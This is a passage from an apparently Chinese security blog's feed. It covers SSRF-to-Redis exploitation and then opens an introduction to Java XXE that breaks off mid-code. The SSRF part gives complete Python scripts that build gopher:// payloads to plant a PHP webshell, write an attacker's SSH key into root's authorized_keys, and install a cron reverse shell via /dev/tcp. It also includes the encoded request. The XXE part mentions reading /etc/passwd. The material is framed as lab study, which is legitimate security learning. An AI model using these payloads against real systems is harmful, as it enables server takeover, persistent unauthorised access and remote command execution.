title="创建Redis服务"></a>创建Redis服务</h3><p>​先运行一个Redis服务，步骤如下：</p><p>​靶机下载redis-4.0.10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.10.tar.gz</span><br></pre></td></tr></table></figure><p>​解压，进入源码目录，然后编译(make、make install)，进入SRC目录，启动redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxf redis-4.0.10.tar.gz   <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> redis-4.0.10    <span class="comment">#进入解压的文件夹内</span></span><br><span class="line">make  </span><br><span class="line">make install <span class="comment">#编译</span></span><br><span class="line"><span class="built_in">cd</span> SRC</span><br><span class="line">redis-server</span><br></pre></td></tr></table></figure><p>​查看redis服务</p><p>​使用另一个终端，输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis-server</span><br></pre></td></tr></table></figure><p><img src="/img/SSRF-redis/image-20250206122138201.png" alt="image-20250206122138201"></p><h3 id="Web服务绝对路径写入Webshell"><a href="#Web服务绝对路径写入Webshell" class="headerlink" title="Web服务绝对路径写入Webshell"></a>Web服务绝对路径写入Webshell</h3><p>​这里用PHP演示，使用前面所提供过的PHP文件。这里我们重点不是Redis，所以直接演示gopher协议写入PHPWebshell。如果有兴趣可以看如下文章：<a href="https://www.cnblogs.com/wjrblogs/p/14456190.html">SSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span>  <span class="comment"># 使用的协议 </span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span>   <span class="comment"># 目标redis的端口号 </span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span>   <span class="comment"># shell的名字 </span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span>      <span class="comment"># 写入的路径</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>   <span class="comment"># 如果有密码 则填入</span></span><br><span class="line"><span class="comment"># 我们的恶意命令 </span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>​执行后即可得到如下payload，构造如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/SSRF.php?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61.139.2.132</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>​来到Web服务的目录下的即可看到shell已写好。</p><p><img src="/img/SSRF-redis/image-20250206133410370.png" alt="image-20250206133410370"></p><h3 id="Redis写入ssh公钥"><a href="#Redis写入ssh公钥" class="headerlink" title="Redis写入ssh公钥"></a>Redis写入ssh公钥</h3><p>​利用条件：Redis拥有root权限。</p><p>​原理：通过在目标机器上写入ssh公钥，然后攻击机便可通过ssh免密码登录。</p><p>​先在攻击机中生成ssh公&#x2F;私钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>​一直回车即可。完成后，即可查看&#x2F;root&#x2F;.ssh下的公私钥。查看id_rsa.pub，复制后利用如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span>  <span class="comment"># 使用的协议 </span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span>   <span class="comment"># 目标redis的端口号 </span></span><br><span class="line">shell=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0TTQ+pRMCoRIoX4Fa2qRhIG4qd0/50Y5e69emOhKFlOVHWXuOnKvTv9Due+g0XN2sPNLTap0Ga9Ix3hPYWsYdwrw7i9afDGkGxs+bf0TshnCvSZFcPP0PCZBul4LWW4wHeQGgOD7hXA695UQVZzS/8i1czIOnuCoXqTzRTQOSvSRNzNEBuChBMYqOsLK9y+9HTwz1GrhA8Iki2+94OUm5vT7z4V44bdWXuNP11ECphpaFEc2ZIpkaQ2fuT17b2HM1XFz/oJv8K3oz6zYf6PX1BV7n/tTMJKKNdRw2cjWiYCO3eun2FRAe9kpnpqD7J4eV9C6OMfjCylGqMW1ksHO4OSuDfpr0+GPecXFQw/sOwQdTLdqQWKl3sHeWVZK5ju9AeGhTGbk/H4fNwKtTRqEf7v6V+hCU7iPGG/00arjjQ63pfDJ8t54WD4pXHknAqPgIbaQAo9PqwfY9IaZ+KOyKXCGjzvqFsDzkdqDBHeeQMaO06O1YIDoqtHzTlMlUuX0= root@player-virtual-machine\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span>   <span class="comment"># shell的名字 </span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span>      <span class="comment"># 写入的路径</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>   <span class="comment"># 如果有密码 则填入</span></span><br><span class="line"><span class="comment"># 我们的恶意命令 </span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>​利用生成的payload，在目标机的&#x2F;root&#x2F;.ssh目录下写入一个authorized_keys文件，然后使用如下命令连接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa root@IP</span><br></pre></td></tr></table></figure><p>​<img src="/img/SSRF-redis/image-20250208135632966.png" alt="image-20250208135632966"></p><h3 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><p>​条件：</p><ol><li>redis 有 root</li><li>Centos由于Redis 输出的文件都是 644 权限，但是 ubuntu 中的定时任务一定要600权限才能实现所以这个方法只适用于Centos</li></ol><p>​未授权访问写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/port 0&gt;&amp;1\n\n\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">&#x27;/var/spool/cron&#x27;</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>​修改之前给出的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;port&#125; 0&gt;&amp;1\n\n\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园</a></p><p><a href="https://blog.csdn.net/weixin_50464560/article/details/122473887">SSRF最全总结(协议,绕过)_ssrf协议-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_34341458/article/details/119771942">Redis未授权访问及利用复现（保姆级教程）_主从复制漏洞影响版本-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaXXE</title>
      <link href="/2025/01/08/JavaXXE/"/>
      <url>/2025/01/08/JavaXXE/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​最近的几场比赛出现了XXE的题目，让我认识到了自己在XXE方面的知识点十分薄弱，所以就花时间深入学习一下XXE的知识点。</p><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>​在正式开始了解XXE之前我们需要先知道什么是XML</p><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>​XML(Extensible Markup Language）：可扩展标记语言，用来存储及传输信息。XML 的一个主要优点是它允许不同的应用程序之间进行数据交换，因为它是一种通用的数据格式。它还可以用于存储数据，并且可以使用 XML 文档来描述数据的结构。</p><p>​如下是一个描述书籍的XML文档：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">book</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;book.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Code Audit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span>hada<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span> <span class="attr">lang</span>=<span class="string">&quot;CN&quot;</span>&gt;</span>hada的代码审计<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tags</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>Java<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>Code Audit<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tags</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pubDate</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>​DTD是文档类型定义的缩写。它是一种用来定义XML文档结构的文本文件，用于描述XML文档中元素的名称、属性和约束关系。DTD可以帮助浏览器或其他应用程序更好地解析和处理XML文档。</p><p>​例如，下面是一个简单的DTD，它描述了一个XML文档，其中包含名为”book”的元素，其中包含一个名为”title”的元素和一个名为”author”的元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT book (title, author)&gt;</span><br><span class="line">&lt;!ELEMENT title (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>​这个DTD声明了”book”元素包含一个”title”元素和一个”author”元素，”title”和”author”元素都只包含文本数据（#PCDATA）。因此，下面的XML文档是有效的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;book&gt; </span><br><span class="line">&lt;title&gt;Code Audit&lt;/title&gt; </span><br><span class="line">&lt;author&gt;hada&lt;/author&gt; </span><br><span class="line">&lt;/book&gt;</span><br></pre></td></tr></table></figure><p>​而下面这个则是无效的，因为他不包含”author”元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;book&gt; </span><br><span class="line">&lt;title&gt;Code Audit&lt;/title&gt; </span><br><span class="line">&lt;/book&gt;</span><br></pre></td></tr></table></figure><h4 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h4><p>​内部的DOCTYPE声明是指将DTD定义直接包含在XML文档中的DOCTYPE声明。这种声明方式通常被称为”内部子集”。形式类似于Java中直接将类写在同一个文件中。内部的DOCTYPE声明的一般形式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> [ </span></span><br><span class="line"><span class="meta">    DTD-definition </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>​其中，root-element 是 XML 文档的根元素，DTD-definition 是 DTD 的定义，包括元素名称、属性和约束关系。</p><p>​例如，如果XML文档的根元素是 “book”，并且 DTD 定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT book (title, author)&gt;</span><br><span class="line">&lt;!ELEMENT title (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>​那么内部的DOCTYPE声明可能如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">book</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">book</span> (<span class="keyword">title</span>, <span class="keyword">author</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">title</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">author</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>​内部的 DOCTYPE 声明的优点是它可以使XML文档更具可移植性，因为它不依赖于外部文件。但是，内部的DOCTYPE声明会使XML文档变得较大，并且如果 DTD 定义很复杂，可能会使XML文档变得难以阅读和维护。</p><h4 id="外部的-DOCTYPE-声明"><a href="#外部的-DOCTYPE-声明" class="headerlink" title="外部的 DOCTYPE 声明"></a>外部的 DOCTYPE 声明</h4><p>​外部的DOCTYPE声明是指将DTD定义保存在单独的文件中，并在XML文档中通过DOCTYPE声明引用该文件的声明。这种声明方式通常被称为”外部子集”，形式类似于PHP中的include。</p><p>​外部的DOCTYPE声明的一般形式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;DTD-location&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​其中，root-element是XML文档的根元素，DTD-location是DTD文件的位置。例如，如果XML文档的根元素是”book”，并且DTD文件位于当前目录中的”book.dtd”文件中，那么外部的DOCTYPE声明可能如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">book</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;book.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​外部的DOCTYPE声明的优点是它使XML文档更易于阅读和维护，因为DTD定义保存在单独的文件中，而不是嵌入在XML文档中。此外，外部的DOCTYPE声明使得可以为多个XML文档使用相同的DTD定义。但是，外部的DOCTYPE声明的缺点是它依赖于外部文件，如果DTD文件丢失或损坏，XML文档可能无法正确解析和处理。</p><p>​DOCTYPE 声明不是必需的，但是它很重要，因为它可以帮助浏览器或其他应用程序正确地解析和处理XML文档。</p><h2 id="什么是XXE？"><a href="#什么是XXE？" class="headerlink" title="什么是XXE？"></a>什么是XXE？</h2><p>​XXE（XML External Entity），即XML外部实体注入漏洞。XXE漏洞发生于应用程序在解析XML时，没有对恶意内容进行过滤，导致可造成<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>，命令执行，攻击内网网站，内网端口扫描，进行DOS攻击等危害。</p><p>​例如，假设应用程序接收用户提交的XML文档，并使用XML处理器解析它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy codePOST /submit-xml HTTP/1.1 </span><br><span class="line">Content-Type: application/xml </span><br><span class="line">&lt;user&gt; </span><br><span class="line">&lt;name&gt;hada&lt;/name&gt; </span><br><span class="line">&lt;email&gt;test@test.com&lt;/email&gt; </span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>​如果XML处理器没有正确配置，它会解析下面这个外部实体，最终会将 &#x2F;etc&#x2F;passwd 文件的内容包含到XML文档中，有可能会返回给前端。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 